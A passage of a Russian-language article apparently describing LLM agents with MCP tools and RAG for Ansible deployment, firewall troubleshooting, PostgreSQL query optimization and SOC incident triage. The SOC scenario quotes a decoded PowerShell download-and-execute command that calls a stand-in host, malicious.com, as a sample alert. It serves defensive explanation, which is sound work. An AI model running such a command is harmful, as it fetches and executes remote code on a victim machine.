────────────┤
│  validate    │  apply        │
│  check       │  rollback     │
└──────────────┴───────────────┘
       │
       ▼
┌──────────────┐
│  Ansible     │ Применяет к серверам
│  Engine      │
└──────────────┘
       │
       ▼
┌──────────────────────────────┐
│  db-01  db-02  db-03  ...    │
└──────────────────────────────┘
```

**Безопасность:**
- Approval для production (требуется подтверждение engineer)
- Automatic rollback при критических ошибках
- Snapshot перед изменениями (если поддерживается)
- Phased rollout: сначала 1 сервер (canary), потом остальные

**Оценка эффекта:**
- ⏱️ Экономия времени: 3 часа → 20 минут = −89%
- 📉 Снижение ошибок: автоматическая валидация, dry-run, исправление ошибок (−70% проблем при деплое)
- 🔄 Ускорение итераций: исправление ошибки 30 мин → 3 мин
- 📚 Автоматическая документация: playbook + runbook создаются одновременно

**Пример реального применения:**

```python
# ansible_automation.py
import requests
import time

LLM_API = "http://llm-api:8000/v1/messages"

def automate_ansible_task(task_description, target_hosts):
    messages = [
        {
            "role": "user",
            "content": f"""Ты DevOps-инженер. Выполни задачу автоматизации с помощью Ansible.

Задача: {task_description}
Целевые хосты: {target_hosts}

Твой workflow:
1. Сгенерируй Ansible playbook (используй generate_playbook)
2. Провалидируй синтаксис (validate_playbook)
3. Выполни dry-run (run_playbook_check)
4. Если есть ошибки/warnings - исправь playbook
5. Примени playbook (apply_playbook)
6. Если есть ошибки выполнения - проанализируй, исправь, переприменяй
7. Выполни smoke tests (check_service_health)
8. Создай документацию (update_inventory_doc)

Начинай выполнение."""
        }
    ]
    
    # Итеративное выполнение с MCP
    max_iterations = 10
    for iteration in range(max_iterations):
        response = requests.post(LLM_API, json={
            "model": "gigachat-latest",
            "messages": messages,
            "tools": load_ansible_mcp_tools(),
            "max_tokens": 2000
        })
        
        response_data = response.json()
        
        # Обработка tool calls
        tool_results = []
        for content_block in response_data['content']:
            if content_block['type'] == 'tool_use':
                print(f"[Iteration {iteration+1}] Executing: {content_block['name']}")
                
                tool_result = execute_ansible_mcp(
                    content_block['name'],
                    content_block['input']
                )
                
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": content_block['id'],
                    "content": json.dumps(tool_result)
                })
                
                print(f"  Result: {tool_result.get('status', 'unknown')}")
            
            elif content_block['type'] == 'text':
                print(f"[LLM] {content_block['text']}")
        
        # Если нет tool calls - задача завершена
        if not tool_results:
            print("\n✓ Задача выполнена успешно!")
            break
        
        # Добавление результатов tool calls в историю
        messages.append({"role": "assistant", "content": response_data['content']})
        messages.append({"role": "user", "content": tool_results})
        
        time.sleep(1)  # Rate limiting

# Запуск
automate_ansible_task(
    task_description="Установи PostgreSQL 15 на серверы, настрой master-slave репликацию, добавь мониторинг",
    target_hosts="db-01,db-02,db-03,db-04,db-05"
)
```

---

## Сценарий 14: Интеллектуальный анализ сетевого трафика и автоматическое создание firewall rules

**Текущая проблема:**
Приложение не работает — "connection refused". Инженеры 20-40 минут выясняют: какой порт нужен, между какими хостами, проверяют firewall rules, добавляют правило, тестируют.

**Как LLM помогает (с MCP + RAG):**
- RAG: архитектура сети, текущие firewall rules, требования ИБ
- LLM анализирует проблему → определяет нужные правила
- MCP инструменты: analyze_traffic, check_firewall, add_firewall_rule, test_connectivity
- Автоматическое создание правил с учетом политик безопасности

**Примеры запросов:**

```
Проблема: "Приложение на app-server-01 не может подключиться к базе db-server-01"

Workflow LLM + MCP + RAG:

1. [LLM анализирует]
   → Нужна проверка сетевой связности

2. [MCP: test_connectivity]
   → telnet app-server-01 → db-server-01:5432
   → Результат: Connection refused

3. [MCP: check_firewall_rules]
   → iptables -L -n | grep 5432
   → Результат: Нет правила для порта 5432

4. [RAG: поиск требований ИБ]
   → Найдено: "Доступ к БД только из application subnet 10.0.2.0/24"
   → Найдено: "Все firewall changes требуют logging"

5. [LLM создает правило с учетом политик]
   → Правило: разрешить 10.0.2.0/24 → db-server-01:5432/tcp с логированием

6. [MCP: validate_firewall_rule]
   → Проверка на конфликты с существующими правилами
   → Проверка соответствия политикам ИБ
   → Результат: ✓ Правило безопасно

7. [MCP: add_firewall_rule] (с dry-run)
   → Показ предпросмотра правила
   → Запрос подтверждения (если production)

8. [Подтверждение получено]

9. [MCP: add_firewall_rule] (apply)
   → iptables -A INPUT -s 10.0.2.0/24 -p tcp --dport 5432 -j LOG --log-prefix "DB_ACCESS"
   → iptables -A INPUT -s 10.0.2.0/24 -p tcp --dport 5432 -j ACCEPT
   → Результат: ✓ Правило добавлено

10. [MCP: test_connectivity]
    → telnet app-server-01 → db-server-01:5432
    → Результат: ✓ Connected

11. [MCP: create_firewall_documentation]
    → Обновлен firewall-rules.md
    → Создан тикет SEC-4567 для audit trail
```

**Требуется для реализации:**

**MCP серверы:**

1. **Network MCP**
   ```python
   Tools:
   - test_connectivity(source, destination, port, protocol)
   - traceroute(source, destination)
   - analyze_packet_capture(host, filter)  # tcpdump анализ
   - check_dns_resolution(hostname)
   ```

2. **Firewall MCP**
   ```python
   Tools:
   - check_firewall_rules(host, port=None)
   - add_firewall_rule(host, rule_spec, dry_run=True)
   - remove_firewall_rule(host, rule_id)
   - validate_firewall_rule(rule_spec)  # Проверка политик
   - backup_firewall_config(host)
   - restore_firewall_config(host, backup_id)
   ```

3. **Security Policy MCP** (с RAG)
   ```python
   Tools:
   - check_security_policy(action, resources)  # Проверка соответствия политикам
   - get_compliance_requirements(service_type)
   - validate_network_change(change_description)
   ```

**RAG база:**
- Архитектура сети (subnets, VLANs, security zones)
- Политики ИБ (разрешенные порты, source/destination restrictions)
- История изменений firewall (для анализа паттернов)
- Compliance требования (PCI DSS, и т.д.)

**Безопасность:**
- Все изменения firewall требуют approval для production
- Автоматический rollback через 5 минут если connectivity test failed
- Change window enforcement (изменения только в разрешенное время)
- Mandatory logging всех firewall events

**Оценка эффекта:**
- ⏱️ Экономия времени: 35 мин troubleshooting → 5 мин = −86%
- 🔒 Снижение рисков ИБ: автоматическая проверка политик (−90% ошибочных правил)
- 📊 Улучшение SLA: MTTR для сетевых проблем −75%
- 📚 Автоматическая документация: каждое изменение документируется

**Пример реального применения:**

```python
# network_troubleshooter.py
import requests

LLM_API = "http://llm-api:8000/v1/messages"

def troubleshoot_connectivity(source, destination, port):
    messages = [
        {
            "role": "user",
            "content": f"""Ты сетевой инженер. Пользователь сообщает о проблеме подключения.

Проблема: {source} не может подключиться к {destination}:{port}

Выполни диагностику и реши проблему:
1. Проверь connectivity (test_connectivity)
2. Если не работает - проверь firewall rules (check_firewall_rules)
3. Проверь политики безопасности (check_security_policy)
4. Если нужно добавить правило:
   - Сформируй правило согласно политикам ИБ
   - Провалидируй (validate_firewall_rule)
   - Добавь с dry-run сначала
   - Если dry-run OK - примени (с запросом approval для production)
5. Протестируй connectivity снова
6. Создай документацию

ВАЖНО: всегда учитывай security policies из RAG.

Начинай диагностику."""
        }
    ]
    
    # Выполнение с MCP + RAG
    response = requests.post(LLM_API, json={
        "model": "gigachat-latest",
        "messages": messages,
        "tools": load_network_mcp_tools() + load_security_policy_tools(),
        "max_tokens": 3000
    })
    
    # ... обработка tool calls аналогично предыдущим сценариям

# Использование
troubleshoot_connectivity(
    source="app-server-01",
    destination="db-server-01",
    port=5432
)
```

---

## Сценарий 15: Автоматическая оптимизация запросов к БД на основе анализа slow query log

**Текущая проблема:**
База данных медленная. DBA анализирует slow query log вручную (2-3 часа), находит проблемные запросы, предлагает индексы, переписывает запросы. Разработчики применяют исправления.

**Как LLM помогает (с MCP + RAG):**
- RAG: схема БД, существующие индексы, статистика запросов
- LLM анализирует slow queries → находит причины → предлагает оптимизации
- MCP инструменты: analyze_query, create_index, test_query_performance, apply_optimization
- Автоматическое создание и применение индексов (с проверкой влияния)

**Примеры запросов:**

```
Проблема: "База PostgreSQL тормозит, пользователи жалуются на медленную загрузку страниц"

Workflow LLM + MCP + RAG:

1. [MCP: get_slow_queries]
   → SELECT query, calls, mean_exec_time FROM pg_stat_statements ORDER BY mean_exec_time DESC LIMIT 10
   → Найдено: запрос "SELECT * FROM orders WHERE user_id = X" выполняется 15ms (50000 раз/час)

2. [MCP: analyze_query]
   → EXPLAIN ANALYZE для проблемного запроса
   → Результат: Seq Scan on orders (cost=0.00..25000 rows=1000000)

3. [RAG: проверка схемы БД]
   → Таблица orders: 5M строк, нет индекса на user_id

4. [LLM предлагает оптимизацию]
   → Создать индекс: CREATE INDEX idx_orders_user_id ON orders(user_id)

5. [MCP: estimate_index_impact]
   → Размер индекса: ~120MB
   → Ожидаемое ускорение: 15ms → 0.5ms (30x)
   → Влияние на INSERT: +5% времени

6. [RAG: проверка disk space]
   → Свободно на диске: 500GB (достаточно для индекса)

7. [MCP: create_index] (с CONCURRENTLY для production)
   → CREATE INDEX CONCURRENTLY idx_orders_user_id ON orders(user_id);
   → Выполнение... (5 минут)
   → Результат: ✓ Индекс создан

8. [MCP: test_query_performance]
   → EXPLAIN ANALYZE для того же запроса
   → Результат: Index Scan using idx_orders_user_id (cost=0.43..8.45 rows=1)
   → Время: 0.4ms (was 15ms) → ускорение 37x ✓

9. [MCP: monitor_query_performance]
   → Мониторинг в течение 10 минут
   → Результат: avg response time снизился с 15ms до 0.5ms

10. [MCP: create_optimization_report]
    → Отчет с описанием проблемы, решения, результатов
    → Создан тикет DBA-8901 для документации

11. [MCP: check_other_queries]
    → Найдены еще 3 похожих запроса без индексов
    → Автоматически создать индексы? [Запрос подтверждения]
```

**Требуется для реализации:**

**MCP серверы:**

1. **Database MCP** (PostgreSQL/MySQL)
   ```python
   Tools:
   - get_slow_queries(limit=10, min_duration_ms=100)
   - analyze_query(query_text)  # EXPLAIN ANALYZE
   - get_table_schema(table_name)
   - get_existing_indexes(table_name)
   - get_table_statistics(table_name)  # размер, кол-во строк
   - create_index(table, columns, concurrent=True)
   - drop_index(index_name)
   - estimate_index_impact(table, columns)
   - vacuum_analyze(table)  # обновление статистики
   ```

2. **Query Optimization MCP**
   ```python
   Tools:
   - rewrite_query(original_query, optimization_hint)
   - suggest_covering_index(query)
   - detect_n_plus_one(queries_list)  # обнаружение N+1 problem
   - suggest_query_refactoring(query)
   ```

3. **Monitoring MCP**
   ```python
   Tools:
   - get_db_metrics(metrics=['cpu', 'iops', 'connections'])
   - monitor_query_performance(query_hash, duration_minutes)
   - check_replication_lag()  # для master-slave
   - get_lock_waits()  # обнаружение deadlocks
   ```

**RAG база:**
- Схема БД (таблицы, колонки, типы, constraints)
- Существующие индексы и их usage statistics
- История оптимизаций (что работало, что нет)
- Best practices для конкретной СУБД

**Безопасность:**
- CREATE INDEX CONCURRENTLY для production (не блокирует таблицу)
- Rollback plan: возможность drop index если производительность ухудшилась
- Проверка disk space перед созданием индекса
- Ограничение: не более N индексов за раз (избежать перегрузки)

**Оценка эффекта:**
- ⏱️ Экономия времени DBA: 3 часа анализа → 15 минут = −92%
- 🚀 Улучшение производительности БД: ускорение запросов в 10-100x
- 📉 Снижение нагрузки на БД: −40% CPU usage благодаря индексам
- 💰 Экономия инфраструктуры: меньше нужно scaling благодаря оптимизации

**Пример реального применения:**

```python
# db_optimizer.py
import requests
import time

LLM_API = "http://llm-api:8000/v1/messages"

def optimize_database(db_connection_string):
    messages = [
        {
            "role": "user",
            "content": """Ты эксперт по оптимизации баз данных PostgreSQL. Выполни анализ и оптимизацию производительности.

Задачи:
1. Получи список медленных запросов (get_slow_queries)
2. Для каждого медленного запроса:
   - Проанализируй план выполнения (analyze_query)
   - Проверь существующие индексы (get_existing_indexes)
   - Если нужно - предложи создание индекса
   - Оцени влияние индекса (estimate_index_impact)
   - Если влияние положительное - создай индекс (create_index)
   - Протестируй производительность после (test_query_performance)
3. Создай отчет с результатами оптимизации

Начинай анализ."""
        }
    ]
    
    optimization_results = []
    
    for iteration in range(20):  # максимум 20 итераций
        response = requests.post(LLM_API, json={
            "model": "gigachat-latest",
            "messages": messages,
            "tools": load_database_mcp_tools(),
            "max_tokens": 2000
        })
        
        response_data = response.json()
        
        # Обработка tool calls
        tool_results = []
        for content_block in response_data['content']:
            if content_block['type'] == 'tool_use':
                tool_name = content_block['name']
                print(f"[{iteration+1}] {tool_name}...")
                
                tool_result = execute_database_mcp(
                    tool_name,
                    content_block['input'],
                    db_connection_string
                )
                
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": content_block['id'],
                    "content": json.dumps(tool_result)
                })
                
                # Логирование результатов
                if tool_name == 'create_index':
                    optimization_results.append({
                        'action': 'index_created',
                        'details': tool_result
                    })
            
            elif content_block['type'] == 'text':
                # Финальный отчет
                if 'Оптимизация завершена' in content_block['text']:
                    print("\n" + "="*50)
                    print(content_block['text'])
                    print("="*50)
                    return optimization_results
        
        if not tool_results:
            break
        
        messages.append({"role": "assistant", "content": response_data['content']})
        messages.append({"role": "user", "content": tool_results})
        
        time.sleep(0.5)
    
    return optimization_results

# Использование
results = optimize_database("postgresql://user:pass@db-server-01:5432/production")

print(f"\nВсего оптимизаций: {len(results)}")
for r in results:
    print(f"- {r['action']}: {r['details']}")
```

---

## Сценарий 16: Автоматическое расследование security инцидентов с помощью SOAR

**Текущая проблема:**
SOC получает 50-200 алертов/день. Аналитик тратит 30-60 минут на расследование каждого: сбор логов, проверка IP в threat intelligence, анализ активности пользователя, корреляция событий.

**Как LLM помогает (с MCP + RAG):**
- RAG: threat intelligence (MITRE ATT&CK, IOCs), baseline активности пользователей
- LLM выполняет automated investigation: сбор артефактов, анализ, классификация угрозы
- MCP инструменты: query_siem, check_threat_intel, get_user_activity, isolate_host, block_ip
- Автоматическое реагирование на подтвержденные угрозы (SOAR-like)

**Примеры запросов:**

```
Алерт: "Suspicious PowerShell execution on DESKTOP-USER01"

Workflow LLM + MCP + RAG (SOAR):

1. [LLM начинает расследование]
   → Нужно собрать контекст инцидента

2. [MCP: query_siem]
   → Запрос: все PowerShell события на DESKTOP-USER01 за последний час
   → Результат: обнаружено выполнение: powershell.exe -enc [base64_encoded_command]

3. [LLM декодирует]
   → Base64 декодирование команды
   → Результат: IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')
   
4. [RAG: проверка IOC]
   → Поиск: malicious.com в threat intelligence
   → Найдено: известный C2 сервер (Cobalt Strike), IOC добавлен 2024-12-05

5. [MCP: get_user_activity]
   → Запрос: активность пользователя на DESKTOP-USER01 за 24 часа
   → Результат: логин в 14:30, открытие email вложения suspicious_invoice.docx в 14:45

6. [MCP: check_email_attachment]
   → Запрос: метаданные suspicious_invoice.docx
   → Результат: макрос обнаружен, VirusTotal: 45/70 vendors flagged as malicious

7. [LLM классифицирует]
   → Тип атаки: Phishing → Macro execution → PowerShell download → C2 beacon
   → MITRE ATT&CK: T1566.001 (Phishing: Spearphishing Attachment), T1059.001 (Command and Scripting Interpreter: PowerShell)
   → Критичность: HIGH (подтвержденная malware infection)

8. [LLM предлагает containment]
   → Изолировать хост DESKTOP-USER01
   → Заблокировать IP malicious.com на firewall
   → Проверить другие хосты на IOCs

9. [Запрос подтверждения у аналитика]
   → "Подтвердить изоляцию хоста? [Y/N]"

10. [Подтверждение получено: Y]

11. [MCP: isolate_host]
    → Отключение сетевого доступа DESKTOP-USER01 (кроме management VLAN)
    → Результат: ✓ Хост изолирован

12. [MCP: block_ip]
    → Добавление malicious.com в blacklist на firewall
    → Результат: ✓ IP заблокирован

13. [MCP: hunt_iocs]
    → Поиск IOCs (malicious.com, payload.ps1 hash) на других хостах
    → Результат: не обнаружено

14. [MCP: create_incident_report]
    → Автоматическое создание детального отчета:
      - Timeline событий
      - IOCs
      - MITRE ATT&CK mapping
      - Предпринятые действия
      - Рекомендации (обучение пользователей, усиление email security)
    
15. [MCP: notify_team]
    → Уведомление в Slack #security-incidents
    → Email руководству ИБ

16. [MCP: create_ticket]
    → Создан тикет SEC-7890 для remediation (переустановка ОС, смена паролей)
```

**Требуется для реализации:**

**MCP серверы:**

1. **SIEM MCP** (интеграция с Wazuh/OSSIM/Elasticsearch)
   ```python
   Tools:
   - query_siem(query, time_range, limit)
   - get_event_details(event_id)
   - correlate_events(event_ids)
   - search_ioc(ioc_value, ioc_type)  # IP, domain, hash
   - get_user_activity(username, time_range)
   - get_host_activity(hostname, time_range)
   ```

2. **Threat Intelligence MCP** (с RAG)
   ```python
   Tools:
   - check_ip_reputation(ip_address)
   - check_domain_reputation(domain)
   - check_file_hash(hash_value)
   - get_mitre_attack_info(technique_id)
   - search_cve(cve_id)
   - query_threat_feed(query)
   ```

3. **Response MCP** (SOAR actions)
   ```python
   Tools:
   - isolate_host(hostname, reason)
   - block_ip(ip_address, firewall_name)
   - block_domain(domain, dns_server)
   - disable_user_account(username, reason)
   - quarantine_file(host, file_path)
   - take_memory_dump(hostname)  # для forensics
   - take_disk_image(hostname)
   ```

4. **Communication MCP**
   ```python
   Tools:
   - create_incident_ticket(title, description, severity)
   - send_slack_alert(channel, message, severity)
   - send_email_alert(recipients, subject, body)
   - update_status_page(component, status, message)
   ```

**RAG база:**
- Threat intelligence feeds (AlienVault OTX, MISP, custom feeds)
- MITRE ATT&CK framework
- Baseline behavior пользователей и систем
- История инцидентов и playbooks реагирования
- Whitelist (известные безопасные IP/домены/процессы)

**Безопасность:**
- Approval workflow для деструктивных действий (isolate host, disable account)
- Confidence scoring: LLM оценивает уверенность в классификации (0-100%)
- Escalation: если confidence < 70% → эскалация аналитику
- Audit trail: все действия логируются с обоснованием

**Оценка эффекта:**
- ⏱️ Экономия времени: 45 мин расследования → 5 мин = −89%
- 🚨 Ускорение реагирования: containment в течение 10 минут вместо 1-2 часов (−85% MTTR)
- 📊 Увеличение throughput SOC: с 20 инцидентов/день до 80-100 (4x)
- 🎯 Снижение false positives: intelligent triage (−50% ложных срабатываний)
- 🔒 Снижение damage от инцидентов: быстрая изоляция (−70% scope of compromise)

**Пример реального применения:**

```python
# soar_investigation.py
import requests
import json
from datetime import datetime

LLM_API = "http://llm-api:8000/v1/messages"

def investigate_security_alert(alert):
    investigation_log = []
    
    messages = [
        {
            "role": "user",
            "content": f"""Ты security analyst в SOC. Проведи автоматическое расследование security alert.

Alert:
- Rule: {alert['rule_name']}
- Host: {alert['host']}
- Severity: {alert['severity']}
- Description: {alert['description']}
- Timestamp: {alert['timestamp']}

Твой investigation workflow:
1. Собери контекст (query_siem для связанных событий)
2. Проверь IOCs в threat intelligence (check_ip_reputation, check_domain_reputation, etc.)
3. Проанализируй активность пользователя/хоста (get_user_activity, get_host_activity)
4. Классифицируй инцидент:
   - Тип атаки
   - MITRE ATT&CK technique
   - Критичность (TRUE_POSITIVE_HIGH / TRUE_POSITIVE_MEDIUM / FALSE_POSITIVE)
   - Confidence level (0-100%)
5. Если TRUE_POSITIVE и confidence > 70%:
   - Предложи containment actions (isolate_host, block_ip, etc.)
   - Запроси подтверждение для деструктивных действий
   - Выполни одобренные действия
6. Создай incident report
7. Уведоми команду

ВАЖНО: для